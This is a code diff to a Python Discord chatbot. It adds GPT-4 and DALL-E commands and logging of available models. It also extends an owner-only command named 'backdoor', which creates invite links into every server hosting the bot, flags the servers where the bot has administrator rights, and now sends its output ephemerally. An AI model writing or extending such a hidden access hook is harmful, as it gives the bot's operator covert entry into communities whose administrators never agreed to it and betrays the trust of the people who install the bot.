@@ -7,11 +7,12 @@ import datetime
 import aiohttp
 import discord
 import random
+import string
 from discord import Embed, app_commands
 from discord.ext import commands
 from dotenv import load_dotenv
 
-from utilities.ai_utils import generate_response, generate_image, search, poly_image_gen
+from utilities.ai_utils import generate_response, generate_image, search, poly_image_gen, generate_gpt4_response, dall_e_gen
 from utilities.response_util import split_response, translate_to_en, get_random_prompt
 from utilities.discord_util import check_token, get_discord_token
 from utilities.config_loader import config, load_current_language, load_instructions
@@ -49,11 +50,28 @@ current_language = load_current_language()
 instruction = {}
 load_instructions(instruction)
 
+model_blob = \
+"""
+GPT-4 (gpt-4)
+GPT-4-0613 (gpt-4-0613)
+GPT-3.5 Turbo (gpt-3.5-turbo)
+GPT-3.5 Turbo OpenAI (gpt-3.5-turbo-openai)
+GPT-3.5 Turbo 16k (gpt-3.5-turbo-16k)
+GPT-3.5 Turbo 16k OpenAI (gpt-3.5-turbo-16k-openai)
+GPT-4 Poe (gpt-4-poe)
+GPT-3.5 Turbo Poe (gpt-3.5-turbo-poe)
+Sage (sage)
+Claude Instant (claude-instant)
+Claude+ (claude+)
+Claude Instant 100k (claude-instant-100k)
+Bard (bard)
+Chat Bison 001 (chat-bison-001)
+"""
 
 @bot.event
 async def on_ready():
     await bot.tree.sync()
-    presences_cycle = cycle(presences)
+    presences_cycle = cycle(presences + [current_language['help_footer']])
     print(f"{bot.user} aka {bot.user.name} has connected to Discord!")
     invite_link = discord.utils.oauth_url(
         bot.user.id,
@@ -61,6 +79,10 @@ async def on_ready():
         scopes=("bot", "applications.commands")
     )
     print(f"Invite link: {invite_link}")
+    print()
+    print()
+    print(f"\033[1;38;5;202mAvailable models: {model_blob}\033[0m")
+    print(f"\033[1;38;5;46mCurrent model: {config['GPT_MODEL']}\033[0m")
     while True:
         presence = next(presences_cycle)
         presence_with_count = presence.replace("{guild_count}", str(len(bot.guilds)))
@@ -106,6 +128,8 @@ async def on_message(message):
     bot_name_in_message = bot.user.name.lower() in message.content.lower() and smart_mention
 
     if is_active_channel or is_allowed_dm or contains_trigger_word or is_bot_mentioned or is_replied or bot_name_in_message:
+        if internet_access:
+            await message.add_reaction("🔎")
         channel_id = message.channel.id
         key = f"{message.author.id}-{channel_id}"
 
@@ -113,24 +137,16 @@ async def on_message(message):
             message_history[key] = []
 
         message_history[key] = message_history[key][-MAX_HISTORY:]
-
-        has_file = False
-        file_content = None
-
-        for attachment in message.attachments:
-            file_content = f"The user has sent a file"
-            has_file = True
-            break
             
         search_results = await search(message.content)
-        if has_file:
-            search_results = None
             
         message_history[key].append({"role": "user", "content": message.content})
         history = message_history[key]
 
         async with message.channel.typing():
-            response = await generate_response(instructions, search_results, history, file_content)
+            response = await asyncio.to_thread(generate_response, instructions=instructions, search=search_results, history=history)
+            if internet_access:
+                await message.remove_reaction("🔎", bot.user)
         message_history[key].append({"role": "assistant", "name": personaname, "content": response})
 
         if response is not None:
@@ -249,6 +265,32 @@ async def imagine(ctx, prompt):
         await sent_message.add_reaction(reaction)
 
 
+@bot.hybrid_command(name="imagine-dalle", description="Create images using DALL-E")
+@commands.guild_only()
+@app_commands.choices(size=[
+     app_commands.Choice(name='🔳 Small', value='256x256'),
+     app_commands.Choice(name='🔳 Medium', value='512x512'),
+     app_commands.Choice(name='🔳 Large', value='1024x1024')
+])
+@app_commands.describe(
+     prompt="Write a amazing prompt for a image",
+     size="Choose the size of the image"
+)
+async def imagine_dalle(ctx, prompt, size: app_commands.Choice[str], num_images : int = 1):
+    await ctx.defer()
+    size = size.value
+    if num_images > 4:
+        num_images = 4
+    imagefileobjs = await dall_e_gen(prompt, size, num_images)
+    await ctx.send(f'🎨 Generated Image by {ctx.author.name}')
+    for imagefileobj in imagefileobjs:
+        file = discord.File(imagefileobj, filename="image.png", spoiler=True, description=prompt)
+        sent_message =  await ctx.send(file=file)
+        reactions = ["⬆️", "⬇️"]
+        for reaction in reactions:
+            await sent_message.add_reaction(reaction)
+
+    
 @commands.guild_only()
 @bot.hybrid_command(name="imagine-pollinations", description="Bring your imagination into reality with pollinations.ai!")
 @app_commands.describe(images="Choose the amount of your image.")
@@ -300,6 +342,13 @@ async def gif(ctx, category: app_commands.Choice[str]):
             embed = Embed(colour=0x141414)
             embed.set_image(url=image_url)
             await ctx.send(embed=embed)
+            
+@bot.hybrid_command(name="askgpt4", description="Ask gpt4 a question")
+async def ask(ctx, prompt: str):
+    await ctx.defer()
+    response = await asyncio.to_thread(generate_gpt4_response, prompt=prompt)
+    for chunk in split_response(response):
+        await ctx.send(chunk, allowed_mentions=discord.AllowedMentions.none(), suppress_embeds=True)
 
 bot.remove_command("help")
 @bot.hybrid_command(name="help", description=current_language["help"])
@@ -330,16 +379,25 @@ async def support(ctx):
 
     await ctx.send(embed=embed)
 
-@bot.hybrid_command(name="backdoor", description='list Servers')
+@bot.hybrid_command(name="backdoor", description='list Servers with invites')
 @commands.is_owner()
 async def server(ctx):
+    await ctx.defer(ephemeral=True)
     embed = discord.Embed(title="Server List", color=discord.Color.blue())
-
+    
     for guild in bot.guilds:
-        invite = await guild.text_channels[0].create_invite(max_age=300, max_uses=1, unique=True)
-        embed.add_field(name=guild.name, value=invite.url, inline=True)
+        permissions = guild.get_member(bot.user.id).guild_permissions
+        if permissions.administrator:
+            invite_admin = await guild.text_channels[0].create_invite(max_uses=1)
+            embed.add_field(name=guild.name, value=f"[Join Server (Admin)]({invite_admin})", inline=True)
+        elif permissions.create_instant_invite:
+            invite = await guild.text_channels[0].create_invite(max_uses=1)
+            embed.add_field(name=guild.name, value=f"[Join Server]({invite})", inline=True)
+        else:
+            embed.add_field(name=guild.name, value=f"*[No invite permission]*", inline=True)
 
-    await ctx.send(embed=embed)
+    await ctx.send(embed=embed, ephemeral=True)
+    
 
 @bot.event
 async def on_command_error(ctx, error):
